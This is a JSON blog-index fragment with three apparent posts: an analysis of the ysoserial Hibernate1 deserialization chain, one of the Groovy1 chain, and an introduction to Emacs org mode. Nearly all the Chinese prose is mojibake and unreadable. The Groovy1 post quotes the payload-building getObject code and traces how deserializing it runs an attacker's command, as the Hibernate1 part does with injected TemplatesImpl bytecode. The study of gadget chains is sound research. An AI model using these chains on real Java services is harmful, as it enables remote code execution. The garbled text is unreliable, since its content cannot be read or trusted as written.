çš„å€¼ä¸º size å±æ€§çš„å€¼ 2ï¼š\nä¸€ç›´æ‰§è¡Œåˆ°æ–¹æ³•æœ€åçš„ for å¾ªç¯ï¼Œä»æ³¨é‡Šå¯ä»¥çŸ¥é“åœ¨è¿™ä¸ªå¾ªç¯ä¸­å–å‡ºæ‰€æœ‰ key å’Œ valueï¼Œå¹¶ä¿å­˜åˆ° HashMap å¯¹è±¡ä¸­ã€‚è¿™é‡Œç”¨åˆ°äº†ä¸Šé¢çš„ mappings å˜é‡ï¼Œå¦‚æœ mappings å˜é‡æ˜¯ 0ï¼Œå°±æ— æ³•è¿›å…¥å¾ªç¯äº†ã€‚\nè·Ÿè¿›æœ€åä¸€è¡Œçš„ hash(key) ï¼Œè¿™é‡Œçš„ key æ˜¯ TypedValue ç±»çš„å¯¹è±¡ã€‚\nè°ƒç”¨ TypedValue.hashCode æ–¹æ³•ï¼š\npublic int hashCode() { return (Integer)this.hashcode.getValue(); } å…¶ä¸­ this.hashcode å±æ€§æ˜¯ä¸€ä¸ªåŒ¿åå†…éƒ¨ç±»ï¼š\nprivate void initTransients() { this.hashcode = new ValueHolder(new DeferredInitializer\u0026lt;Integer\u0026gt;() { public Integer initialize() { return TypedValue.this.value == null ? 0 : TypedValue.this.type.getHashCode(TypedValue.this.value); } }); } å¯ä»¥çœ‹åˆ°åŒ¿åå†…éƒ¨ç±»ä¸­æœ‰ä¸€ä¸ª initialize æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šåœ¨ getValue æ–¹æ³•ä¸­è¢«è°ƒç”¨ã€‚ä»ä¸Šé¢çš„ç±»å›¾å¯ä»¥å¾ˆæ¸…æ¥šåœ°çœ‹åˆ°ï¼ŒTypedValue çš„ value å±æ€§å’Œ type å±æ€§åˆ†åˆ«æ˜¯ TemplatesImpl å¯¹è±¡å’Œ ComponentType å¯¹è±¡ã€‚\nç»§ç»­è·Ÿè¿›ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ï¼š\næ‰§è¡Œåˆ° PojoComponentTuplizer çš„ getPropertyValue æ–¹æ³•ï¼Œå¹¶è·å–æˆ‘ä»¬ä¹‹å‰æ„é€ çš„ BasicPropertyAccessor$BasicGetter å¯¹è±¡ï¼Œæ‰§è¡Œå…¶ get æ–¹æ³•ï¼Œå‚æ•°æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ TemplatesImpl å¯¹è±¡ã€‚\né€šè¿‡åå°„æœºåˆ¶è°ƒç”¨ TemplatesImpl.getOutputProperties æ–¹æ³•ï¼š\nè·Ÿè¿› newTransformer æ–¹æ³•ï¼š\nç„¶åè¿›å…¥æˆ‘ä»¬çš„æœ€ç»ˆçš„ç›®æ ‡æ–¹æ³• getTransletInstanceï¼š\nä¹‹æ‰€ä»¥åœ¨å¼€å§‹è®¾ç½® TemplatesImpl çš„ _name å±æ€§ï¼Œå°±æ˜¯ä¸ºäº†é€šè¿‡è¿™é‡Œçš„ if åˆ¤æ–­ã€‚\næ­¤æ—¶ _class çš„å€¼æ˜¯ nullï¼Œè°ƒç”¨ defineTransletClasses æ–¹æ³•å°† _bytecodes ä¸­çš„æ¯ä¸ª byte[] æ•°ç»„è¿˜åŸæˆä¸€ä¸ª Class å¯¹è±¡ï¼Œå†™åˆ° _class ä¸­ã€‚\nå¯è§æ­¤æ—¶çš„ _class[0] æ˜¯æˆ‘ä»¬é€šè¿‡ Javassit åº“æ„é€ çš„ StubTransletPayload ç±»ï¼Œå®ƒçš„é™æ€ä»£ç å—ä¿å­˜ç€æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚\nç´§æ¥ç€å®ä¾‹åŒ–äº†è¿™ä¸ªç±»ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚\nè¿™é‡Œè¿˜ç•™æ„åˆ° _class[1] ä¹Ÿæ˜¯æˆ‘ä»¬æ„é€ çš„ Foo ç±»ï¼Œç„¶è€Œè¿™ä¸ªç±»ä¼¼ä¹å¯¹è¿‡ç¨‹æ²¡ä»€ä¹ˆå½±å“ï¼Œä¸å¤ªæ˜ç™½æ„é€ è¿™ä¸ªç±»çš„ç”¨æ„ğŸ¤”\n","date":"2021-01-26","permalink":"https://zrquan.github.io/posts/ysoserial-hibernate1/","tags":["java","deserialize"],"title":"Ysoserial-Hibernate1"},{"content":"æœ€è¿‘æƒ³è¦åŠ å¼ºä¸€ä¸‹è‡ªå·±çš„ä»£ç èƒ½åŠ›å’Œæ¼æ´åˆ†æèƒ½åŠ›ï¼Œäºæ˜¯æƒ³åˆ°å­¦ä¹  ysoserial çš„ä»£ç ã€‚æ–‡ç« ä¸»è¦è®°å½•è‡ªå·±è°ƒè¯•çš„è¿‡ç¨‹ï¼Œç†æ¸…åˆ©ç”¨é“¾çš„æ€è·¯ï¼Œå¯¹ä¸€äº›åŸºç¡€çŸ¥è¯†ä¸ä¼šåšè¿‡å¤šè§£é‡Šã€‚\næºä»£ç  ä¸€äº›å¯¼å…¥åŒ…ã€æ³¨é‡Šã€å£°æ˜ä¹‹ç±»çš„å°±å¿½ç•¥äº†ï¼Œä¸‹é¢ç»™å‡ºä¸»è¦çš„ getObject å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæ¶æ„å¯¹è±¡(AnnotationInvocationHandler)ï¼Œå½“ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡æ—¶å°±èƒ½æ‰§è¡Œå‘½ä»¤ã€‚\npublic InvocationHandler getObject(final String command) throws Exception { final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, \u0026quot;execute\u0026quot;), \u0026quot;entrySet\u0026quot;); final Map map = Gadgets.createProxy(closure, Map.class); final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map); return handler; } å¯ä»¥çœ‹åˆ°ä»£ç å¾ˆå°‘ï¼Œé™¤äº† return ä¸€å…±å°±ä¸‰è¡Œï¼Œåœ¨è°ƒè¯•å‰å…ˆç®€è¦è¯´ä¸€ä¸‹æ¯è¡Œä»£ç çš„ä½œç”¨ï¼š\nåˆ›å»ºä¸€ä¸ª closure å¯¹è±¡ï¼Œå°†æˆ‘æƒ³æ‰§è¡Œçš„å‘½ä»¤(command)ä¿å­˜åˆ°è¯¥å¯¹è±¡çš„å±æ€§ä¸­ã€‚è¯¥ç±»å®ç°äº† InvocationHandler æ¥å£ï¼Œæ‰€ä»¥å¯ä»¥ä½œä¸ºåŠ¨æ€ä»£ç†çš„å¤„ç†å™¨ï¼›\nåˆ›å»ºä¸€ä¸ª map å¯¹è±¡ï¼Œå®åˆ™æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•æ—¶ä¼šä»£ç†åˆ°ä¸Šé¢çš„ closure å¯¹è±¡çš„å¤„ç†é€»è¾‘ä¸­(invoke)ï¼›\nåˆ›å»ºæœ€ç»ˆçš„æ¶æ„å¯¹è±¡ï¼ŒæŠŠä¸Šé¢çš„åŠ¨æ€ä»£ç†å¯¹è±¡ map ä¿å­˜åˆ°å±æ€§ä¸­ï¼Œå½“ååºåˆ—åŒ– handler æ—¶ï¼Œå°±ä¼šé€šè¿‡å±‚å±‚è°ƒç”¨æœ€ç»ˆæ‰§è¡Œ closure é‡Œé¢çš„å‘½ä»¤ã€‚\næ„é€  payload é¦–å…ˆçœ‹ä¸€ä¸‹ ConvertedClosure ç±»çš„æ„é€ å‡½æ•°ï¼š\nè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ å‡½æ•°å¹¶è®¾ç½®äº† methodName å±æ€§ï¼Œè·Ÿè¿›å…¶çˆ¶ç±» ConversionHandler çš„æ„é€ å‡½æ•°ï¼š\næ¥ç€è·Ÿè¿› MethodClosure ç±»çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š\nä»¥ä¸Šè¿‡ç¨‹çš„é‡ç‚¹éƒ½æ˜¯ä¸€äº›å±æ€§èµ‹å€¼çš„æ“ä½œï¼Œè€Œæ”»å‡»ååºåˆ—åŒ–è¿‡ç¨‹å°±æ˜¯è¦åˆ©ç”¨è¿™äº›å—æˆ‘æ§åˆ¶çš„å±æ€§å»å½±å“ä¸€äº›ä»£ç ç‰‡æ®µï¼Œè€Œè¿™äº›ä»£ç ç‰‡æ®µéœ€è¦æ„æˆå®Œæ•´çš„åˆ©ç”¨é“¾ã€‚\nè¿™é‡Œå…ˆè®°å½•ä¸€ä¸‹ closure å¯¹è±¡çš„ä¸€äº›å…³é”®å±æ€§ï¼Œå†æ¥ç€çœ‹ä¸‹å»ï¼š\nclosure.methodName = \u0026quot;entrySet\u0026quot;; closure.delegate = new MethodClosure(command, \u0026quot;execute\u0026quot;); closure.delegate.method = \u0026quot;execute\u0026quot;; closure.delegate.owner = command; æ¥ç€æ˜¯è°ƒç”¨ Gadgets.createProxy æ–¹æ³•ï¼Œé€šè¿‡ Proxy.newProxyInstance åˆ›å»ºä¸€ä¸ª Map ç±»å‹çš„ä»£ç†å¯¹è±¡ï¼š\nnewProxyInstance çš„ç¬¬äºŒä¸ªå‚æ•°(allIfaces)æ˜¯ä»£ç†ç±»è¦å®ç°çš„æ¥å£ï¼Œè¿™é‡Œåªæœ‰ Map.class ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ Class.cast å°†ç±»å‹è½¬æ¢æˆ Mapã€‚\nç¬¬ä¸‰ä¸ªå‚æ•°(ih)æ˜¯ InvocationHandler ç±»çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ closureï¼Œæ— è®ºè°ƒç”¨ä»£ç†å¯¹è±¡çš„é‚£ä¸ªæ–¹æ³•ï¼Œéƒ½ä¼šæ‰§è¡Œ InvocationHandler å¯¹è±¡ä¸­é‡å†™çš„ invoke æ–¹æ³•ã€‚\næœ€åå†çœ‹çœ‹ Gadgets.createMemoizedInvocationHandler ï¼š\ngetFirstCtor æ–¹æ³•å¯ä»¥é€šè¿‡åå°„å¾—åˆ° AnnotationInvocationHandler ç±»çš„æ„é€ å‡½æ•°ï¼Œä¹‹æ‰€ä»¥é€šè¿‡åå°„æœºåˆ¶ï¼Œæ˜¯å› ä¸º AnnotationInvocationHandler çš„æ„é€ å‡½æ•°æ²¡æœ‰ public ä¿®é¥°ï¼Œä¸èƒ½é€šè¿‡ new ç›´æ¥è®¿é—®ã€‚\nä» AnnotationInvocationHandler çš„æ„é€ å‡½æ•°çœ‹åˆ°ï¼Œæˆ‘ä¼ å…¥çš„ map å¯¹è±¡å°†ä¼šèµ‹å€¼ç»™ memberValues å±æ€§ï¼š\nåˆ°è¿™é‡Œä¸ºæ­¢ï¼Œpayload çš„æ„é€ åŸºæœ¬å®Œæˆäº†ï¼Œå½“è¿™ä¸ª AnnotationInvocationHandler å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œä¸Šè¿°è®¾ç½®å¥½çš„å±æ€§å°±ä¼šå½±å“è¿‡ç¨‹ä¸­çš„ä¸€äº›ä»£ç ç‰‡æ®µï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚\nååºåˆ—åŒ–è¿‡ç¨‹ ååºåˆ—åŒ–çš„å…¥å£ç‚¹è‡ªç„¶æ˜¯ readObject æ–¹æ³•ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹çœ‹ AnnotationInvocationHandler.readObject() éƒ½åšäº†ä»€ä¹ˆæ“ä½œï¼š\nçœ‹çº¢è‰²æ¡†éƒ¨åˆ†å°±çŸ¥é“æ‰§è¡Œäº† memberValues å±æ€§çš„ entrySet æ–¹æ³•ã€‚\nè€Œè¿™ä¸ª memberValues åˆ™æ˜¯æˆ‘ä¼ å…¥çš„åŠ¨æ€ä»£ç†å¯¹è±¡ mapï¼Œè°ƒç”¨å®ƒçš„æ–¹æ³•å®åˆ™æ‰§è¡Œ InvocationHandler.invoke() ã€‚\nä»è°ƒç”¨æ ˆå¯ä»¥çŸ¥é“ï¼Œinvoke æ–¹æ³•åœ¨ ConvertedClosure çš„çˆ¶ç±» ConversionHandler ä¸­ï¼Œåœ¨æ‰§è¡Œäº†ä¸€äº›ç‰ˆæœ¬åˆ¤æ–­ç›¸å…³çš„é€»è¾‘åï¼Œåˆè·³åˆ°äº† ConvertedClosure çš„ invokeCustom æ–¹æ³•ã€‚\npublic Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable { return this.methodName != null \u0026amp;\u0026amp; !this.methodName.equals(method.getName()) ? null : ((Closure)this.getDelegate()).call(args); } è¿™é‡Œ \u0026amp;\u0026amp; çš„ä¼˜å…ˆçº§é«˜äºä¸‰ç›®è¿ç®—ç¬¦ï¼Œå½“ this.methodName æ—¢ä¸ç­‰äºç©ºä¹Ÿä¸ç­‰äº method.getName() æ—¶è¿”å› nullï¼Œä¸ç„¶å°±ä¼šæ‰§è¡Œ ((Closure)this.getDelegate()).call(args)\næˆ‘ä»¬å›é¡¾ä¸€ä¸‹åœ¨æ„é€  payload æ—¶ï¼Œè®¾ç½®çš„ä¸€äº›å±æ€§ï¼š\nclosure.methodName = \u0026quot;entrySet\u0026quot;; closure.delegate = new MethodClosure(command, \u0026quot;execute\u0026quot;); closure.delegate.method = \u0026quot;execute\u0026quot;; closure.delegate.owner = command; ä¸€å¼€å§‹å°±å°† ConvertedClosure å¯¹è±¡çš„ methodName å±æ€§è®¾ç½®ä¸º entrySetï¼Œæ­£å¥½å°±æ˜¯ AnnotationInvocationHandler.readObject() ä¸­æ‰€æ‰§è¡Œçš„æ–¹æ³•ã€‚\nthis.getDelegate() ä¼šè¿”å›ä»€ä¹ˆä¹Ÿå¾ˆæ˜¾è€Œæ˜“è§äº†ï¼Œé‚£ä¹ˆè·Ÿè¿›ä¸€ä¸‹ call() ï¼š\nç›´æ¥è¿›å…¥åˆ° MetaClassImpl ç±»çš„ invokeMethod æ–¹æ³•ä¸­ï¼Œç´§æ¥ç€è°ƒç”¨ä¸€ä¸ªé‡è½½çš„ invokeMethod æ–¹æ³•ã€‚\nè¿™ä¸ªå‡½æ•°ä»£ç æ¯”è¾ƒå¤šï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€è¦è·Ÿè¸ª object å‚æ•°ï¼Œå› ä¸ºéœ€è¦æ‰§è¡Œçš„å‘½ä»¤åœ¨è¿™ä¸ªå‚æ•°å¯¹è±¡çš„å±æ€§ä¸­ã€‚\nè¿è¡Œåˆ°ä»¥ä¸‹ä»£ç ï¼Œæˆ‘æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤è¢«æ‹¿äº†å‡ºæ¥ï¼š\nownerMetaClass ä¾ç„¶æ˜¯ MetaClassImpl ç±»ï¼Œæ‰€ä»¥è¿™é‡Œé€’å½’è°ƒç”¨äº† invokeMethod æ–¹æ³•ï¼Œä¸è¿‡ MethodClosure å¯¹è±¡å˜æˆäº†æˆ‘è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯ Stringã€‚\nå› æ­¤è¿™ä¸€æ¬¡ä¸ä¼šè¿›å…¥ if (isClosure) ï¼Œè€Œæ˜¯æ‰§è¡Œåˆ°ä»¥ä¸‹ return è¯­å¥ä¸­\nreturn method != null ? method.doMethodInvoke(object, arguments) : this.invokePropertyOrMissing(object, methodName, originalArguments, fromInsideClass, isCallToSuper); å‘½ä»¤å­—ç¬¦ä¸²ä» doMethodInvoke è¿›å…¥åˆ° ProcessGroovyMethods.execute ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼š\n","date":"2021-01-19","permalink":"https://zrquan.github.io/posts/ysoserial-groovy1/","tags":["java","deserialize"],"title":"Ysoserial-Groovy1"},{"content":" è¿™å¥½åƒæ˜¯æˆ‘ç¬¬ä¸‰æ¬¡å¼€å§‹å†™åšå®¢äº†ï¼Œå‰ä¸¤æ¬¡éƒ½æ˜¯æ°´äº†å‡ ç¯‡ç¬”è®°å°±æ”¾å¼ƒäº†ï¼Œä¸€æ–¹é¢æ˜¯æˆ‘æœ¬æ¥å°±ä¸å–œæ¬¢å†™ä¸œè¥¿ï¼Œå¦ä¸€æ–¹é¢æ˜¯æ„Ÿè§‰å†™åšå®¢å¤ªèŠ±æ—¶é—´äº†ï¼Œä¸»é¢˜ã€æ ¼å¼ã€é…ç½®ä¸€é¡¿æŠ˜è…¾ï¼Œåˆå†™ä¸å‡ºä»€ä¹ˆæœ‰è¥å…»çš„ä¸œè¥¿ğŸ˜‚\nä½†æœ€è¿‘æ²‰è¿·äº emacs å’Œ org modeï¼Œå¥½åƒè®©æˆ‘æ‰¾åˆ°äº†åšç¬”è®°çš„å¿«æ„Ÿ(è™½ç„¶è¿˜æ²¡åšå¤šå°‘)ï¼Œæ‰€ä»¥æ‰“ç®—å†å°è¯•ä¸€æ¬¡ï¼Œå¸Œæœ›èƒ½åšæŒä¸‹å»ã€‚\né‚£ç¬¬ä¸€ç¯‡æ–‡ç« è‡ªç„¶æ˜¯è¦æ¨èä¸€ä¸‹æ— æ•Œçš„ org mode å•¦ï¼Œäº‹å…ˆå£°æ˜æœ¬æ–‡ä¸»è¦æ˜¯ä¸ºäº†å®‰åˆ©ï¼Œå±•ç¤ºä¸€ä¸‹ org mode å¯ä»¥å¹²ä»€ä¹ˆï¼Œæƒ³çœ‹æ•™ç¨‹çš„è¯å»ºè®®çœ‹å®˜æ–¹æ–‡æ¡£ã€‚\nä»€ä¹ˆæ˜¯ org mode å’Œå¤§å®¶ç†Ÿæ‚‰çš„ markdown ä¸€æ ·ï¼Œorg mode ä¹Ÿå¯ä»¥é€šè¿‡ä¸åŒçš„æ ‡è®°æ¥ç»„ç»‡æ–‡æœ¬çš„æ ¼å¼ã€ç»“æ„ï¼Œè€Œä¸”æ”¯æŒçš„æ ‡è®°å’ŒåŠŸèƒ½æ›´åŠ ä¸°å¯Œã€‚é™¤äº†å†™æ–‡ç« ï¼Œä½ è¿˜å¯ä»¥ç”¨å®ƒæ¥ç®¡ç†æ—¥ç¨‹ã€è®°å½•å¾…åŠäº‹é¡¹ã€æ–‡å­¦ç¼–ç¨‹ã€å†™ LaTeX ç­‰ç­‰ã€‚\nå®˜ç½‘ä¸Šçš„ç¤ºä¾‹ #+title: Example Org File #+author: TEC #+date: 2020-10-27 * Revamp orgmode.org website The /beauty/ of org *must* be shared. [[https://upload.wikimedia.org/wikipedia/commons/b/bd/Share_Icon.svg]] ** DONE Make screenshots CLOSED: [2020-09-03 Thu 18:24] ** DONE Restyle Site CSS Go through [[file:style.scss][stylesheet]] ** TODO Check CSS on main pages [42%] - [X] Index page - [X] Quickstart - [ ] Features - [ ] Releases - [X] Install - [ ] Manual - [ ] Contribute * Learn Org Org makes easy things trivial and complex things practical. You don't need to learn Org before using Org: read the quickstart page and you should be good to go. If you need more, Org will be here for you as well: dive into the manual and join the community! ** Feedback #+include: \u0026quot;other/feedback.org*manual\u0026quot; :only-contents t * Check CSS minification ratios #+begin_src python from pathlib import Path cssRatios = [] for css_min in Path(\u0026quot;resources/style\u0026quot;).glob(\u0026quot;*.min.css\u0026quot;): css = css_min.with_suffix('').with_suffix('.css') cssRatios.append([css.name, \u0026quot;{:.0f}% minified ({:4.1f} KiB)\u0026quot;.format( 100 * css_min.stat().st_size / css.stat().st_size, css_min.stat().st_size / 1000)]) return cssRatios #+end_src #+RESULTS: | index.css | 76% minified ( 1.4 KiB) | | org-demo.css | 77% minified ( 2.8 KiB) | | errors.css | 74% minified ( 4.9 KiB) | | org.css | 75% minified (10.7 KiB) | ä¸Šé¢çš„ org æ–‡ä»¶åœ¨æˆ‘çš„ emacs ä¸Šçš„æ ·å­ï¼š\né™¤äº†ç®€å•çš„æ¸²æŸ“ï¼Œorg mode è¿˜æä¾›äº†å¾ˆå¤šå‘½ä»¤å’Œå‡½æ•°ï¼Œè®©ä½ å¯ä»¥å¯¹ä¸åŒç±»å‹çš„æ–‡æœ¬è¿›è¡Œå„ç§æ“ä½œã€‚\nåŸºæœ¬åŠŸèƒ½ ä¸€ä¸ª org æ–‡ä»¶çš„åŸºæœ¬ç»“æ„æ˜¯ä¸€æ£µæ ‘ï¼Œä»¥æ­¤æ¥è¡¨ç°ä¸åŒæ®µè½çš„å±‚çº§å…³ç³»ï¼Œä½ å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹ä¸åŒçš„èŠ‚ç‚¹æˆ–å­æ ‘è¿›è¡ŒæŠ˜å ã€å±•å¼€ã€éšè—ç­‰å„ç§æ“ä½œï¼Œä¸“æ³¨äºæ–‡ä»¶çš„æŸä¸€éƒ¨åˆ†è€Œä¸å—å…¶ä»–ä¿¡æ¯çš„å½±å“ã€‚\nOrg mode æä¾›äº†è¡¨æ ¼ç¼–è¾‘åŠŸèƒ½ï¼Œä¸€äº›åŸºç¡€æ“ä½œæ¯”å¦‚ï¼šè¡Œåˆ—ç¼–è¾‘ã€è‡ªåŠ¨å¯¹é½ã€è¡¨æ ¼è®¡ç®—ç­‰ç­‰ï¼Œéƒ½å¯ä»¥é€šè¿‡ç®€å•çš„å‘½ä»¤æˆ–è€…å¿«æ·é”®å®Œæˆã€‚\nOrg mode çš„ä»£ç å—ä¸ä»…ä»…æä¾›é«˜äº®ï¼Œå®ƒå¯ä»¥ç»™æ•°åç§è¯­è¨€æä¾›ç»Ÿä¸€çš„æ‰§è¡Œç¯å¢ƒï¼Œä¼ é€’æ¯ä¸ªä»£ç å—çš„æ‰§è¡Œç»“æœã€‚ç®€å•æ¥è¯´ï¼Œä½ å¯ä»¥ç”¨ org mode è¿›è¡Œ(æ–‡å­¦)ç¼–ç¨‹ï¼Œç±»ä¼¼äº Jupyter Notebookã€‚\nåœ¨ org mode å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ’å…¥å„ç§ç±»å‹çš„é“¾æ¥ï¼ŒåŒ…æ‹¬ç½‘é¡µã€æ–‡ä»¶ã€é‚®ä»¶ã€git ä»“åº“ç­‰ç­‰ï¼Œå¦‚æœä½ ç†Ÿæ‚‰ elispï¼Œç”šè‡³å¯ä»¥è‡ªå®šä¹‰é“¾æ¥ç±»å‹ï¼Œæ›´æ”¹é“¾æ¥çš„è¡Œä¸ºã€‚ä¸è¿‡æˆ‘ä¹Ÿæ˜¯ emacs å’Œ org mode çš„åˆå­¦è€…ï¼Œå¯¹ elisp è¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œæ„Ÿå…´è¶£çš„è¯å¯ä»¥çœ‹çœ‹å®˜æ–¹çš„ç¤ºä¾‹ã€‚\nä½ å¯ä»¥ç”¨ org mode æ¥å†™å‡ ä¹ä»»ä½•ç±»å‹çš„ä½œå“ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ã€æ‰©å±•æ€§é«˜çš„å¯¼å‡ºå¼•æ“ï¼Œä½ å¯ä»¥è‡ªå®šä¹‰å¯¼å‡ºæ–‡ä»¶çš„æ ¼å¼ã€‚åŒæ—¶ org mode ä¹Ÿæ”¯æŒ Pandoc ä½œä¸ºå¯¼å‡ºå·¥å…·ã€‚\nå› ä¸ºæˆ‘å¾ˆå°‘å°† org æ–‡ä»¶å¯¼å‡ºåˆ°å…¶ä»–æ ¼å¼ä¸­ï¼Œæ‰€ä»¥æ²¡æ€ä¹ˆæŠ˜è…¾è¿™æ–¹é¢çš„é…ç½®ï¼Œå°±åªæ¼”ç¤ºä¸€ä¸‹å°† org æ–‡ä»¶å¯¼å‡ºæˆ html æ–‡æ¡£å§ã€‚\nOrg mode è¿˜æœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œæ¯”å¦‚ä½ å¯ä»¥ç»™æ¯ä¸ªæ ‡é¢˜è®¾ç½®æ ‡ç­¾ã€å±æ€§ã€é™„ä»¶ã€æ—¶é—´æˆ³ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä¿®æ”¹å›¾ç‰‡å¤§å°ã€å¯¼å‡ºæ ·å¼ï¼Œè¿˜å¯ä»¥ç”¨ Drawer éšè—ä¸€äº›ä¿¡æ¯ï¼Œä»¥åŠå¾ˆå¤šæˆ‘è¿˜æ²¡äº†è§£åˆ°çš„åŠŸèƒ½ã€‚ä¸‹é¢çš„ç« èŠ‚ä»‹ç»ä¸€äº›å¸¸ç”¨çš„ï¼Œä¸”æˆ‘ä¸ªäººè§‰å¾—å¾ˆæœ‰å¸®åŠ©çš„åŠŸèƒ½å’Œæ’ä»¶ï¼Œå‰©ä¸‹çš„å°±ä¸ä¸€ä¸€å±•ç¤ºäº†ï¼Œå»ºè®®æœ‰å…´è¶£çš„ç›´æ¥å»çœ‹å®˜æ–¹æ‰‹å†Œã€‚\nCapture \u0026amp; Refile ç”¨è¿‡ OneNote çš„åº”è¯¥çŸ¥é“å®ƒæœ‰ä¸€ä¸ªâ€œå¿«é€Ÿç¬”è®°â€ï¼Œç”¨æ¥å¿«é€Ÿè®°å½•ä¸€äº›çµæ„Ÿæˆ–è€…æ‘˜æŠ„ï¼Œå¾…ä¹‹åå†è¿›è¡Œæ•´ç†ã€‚Org mode çš„ Capture åŒæ ·å¯ä»¥è®©ä½ åœ¨(emacs ä¸Š)ä»»ä½•åœ°æ–¹è¿›è¡Œç¬”è®°ï¼Œç„¶åè‡ªåŠ¨ä¿å­˜åˆ°ä½ è®¾ç½®å¥½çš„ org æ–‡ä»¶ä¸­ã€‚\nOrg Capture æ›´å¥½ç”¨çš„åœ°æ–¹æ˜¯ï¼Œä½ å¯ä»¥è‡ªå®šä¹‰â€å¿«é€Ÿç¬”è®°â€çš„æ¨¡æ¿ã€ä¿å­˜æ–¹å¼ï¼Œæ¯”å¦‚ä»¥ä¸‹è®¾ç½®ï¼š\n(setq org-capture-templates '((\u0026quot;i\u0026quot; \u0026quot;å¾…åŠäº‹é¡¹\u0026quot; entry (file \u0026quot;~/org/blog/inbox.org\u0026quot;) \u0026quot;* TODO %?\\n %T\\n %i\\n\u0026quot;) (\u0026quot;n\u0026quot; \u0026quot;å¿«é€Ÿç¬”è®°\u0026quot; entry (file \u0026quot;~/org/blog/quick-notes.org\u0026quot;) \u0026quot;* %?\\n%x\\n\u0026quot; :jump-to-captured t) )) è¿™æ®µä»£ç è®¾ç½®äº†ä¸¤ä¸ª Capture æ¨¡æ¿â€”â€”ä¸€ä¸ªæ˜¯å¾…åŠäº‹é¡¹ï¼Œå¿«æ·é”®æ˜¯ i ï¼Œå®ƒä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª TODO äº‹é¡¹å¹¶æ’å…¥å½“å‰çš„æ—¶é—´æˆ³ï¼Œä¿å­˜åˆ° inbox.org æ–‡ä»¶ä¸­ï¼›å¦ä¸€ä¸ªæ˜¯å¿«é€Ÿç¬”è®°ï¼Œå¿«æ·é”®æ˜¯ n ï¼Œå®ƒä¼šè‡ªåŠ¨ç²˜è´´å‰ªåˆ‡æ¿çš„æ–‡æœ¬åˆ°ç¬”è®°ä¸­ï¼Œä¸”åœ¨å®Œæˆåè·³è½¬åˆ°ç¬”è®°æ–‡ä»¶ã€‚\nå½“ä½ éœ€è¦æ•´ç† Capture ç¬”è®°æ—¶ï¼Œå¯ä»¥ç”¨ Refile åŠŸèƒ½ï¼Œå®ƒå¯ä»¥å°†ä¸€ä¸ªæ®µè½è½¬ç§»æˆ–å¤åˆ¶åˆ°ä»»æ„ org æ–‡ä»¶ä¸­ï¼Œæˆ–å…¶ä»–æ®µè½ä¸‹ã€‚ä½ ä¹Ÿå¯ä»¥ç”¨å¤åˆ¶ç²˜è´´åšåˆ°è¿™ä¸€ç‚¹ï¼Œä½† Refile æ›´ä¼˜é›…ğŸ˜\nOrg Agenda Org Agenda æ˜¯ä¸€ä¸ªæ—¥ç¨‹ç®¡ç†å·¥å…·ï¼Œæä¾›äº†ä¸€ä¸ªç•Œé¢è¿›è¡Œæ—¥ç¨‹ç›¸å…³çš„æ“ä½œã€‚\nå‰é¢æåˆ°äº† TODO å…³é”®å­—ï¼Œå®é™…ä¸Šä½ å¯ä»¥è‡ªå®šä¹‰ä»»æ„å…³é”®å­—æ¥è¯´æ˜è¯¥äº‹é¡¹çš„çŠ¶æ€ï¼Œæ¯”å¦‚ï¼š\n(setq org-todo-keywords '((sequence \u0026quot;TODO(t)\u0026quot; \u0026quot;WAIT(w)\u0026quot; \u0026quot;SOMEDAY(s)\u0026quot; \u0026quot;|\u0026quot; \u0026quot;DONE(d!)\u0026quot; \u0026quot;CANCELED(c@/!)\u0026quot;))) ä»¥ä¸Šä»£ç è®¾ç½®äº† 5 ç§çŠ¶æ€ï¼Œåä¸¤ç§æ„å‘³ç€è¯¥äº‹é¡¹å·²ç»ç»“æŸäº†(å®Œæˆæˆ–å–æ¶ˆ)ï¼Œ d! è¿™ä¸ªå¹å·æŒ‡å½“äº‹é¡¹åˆ‡æ¢ä¸º DONE æ—¶ä¼šæ’å…¥å½“å‰çš„æ—¶é—´ï¼Œ c@/! ä¸ä»…æ’å…¥æ—¶é—´ï¼Œè¿˜å¯ä»¥å†™æ³¨é‡Šè¯´æ˜å–æ¶ˆçš„åŸå› ã€‚\né™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥ç»™æ¯ä¸ªäº‹é¡¹è®¾ç½®æ—¥æœŸæ—¶é—´ã€ä¼˜å…ˆçº§ã€deadlineï¼Œç„¶åé€šè¿‡ Org Agenda è¿›è¡Œç»Ÿä¸€ç®¡ç†ï¼š\nâ— Agenda çš„ç•Œé¢æ˜¯å¯ä»¥è‡ªå·±é…ç½®çš„ï¼Œä½ å¯ä»¥å°†æ—¥ç¨‹è§†å›¾æ”¹æˆä½ 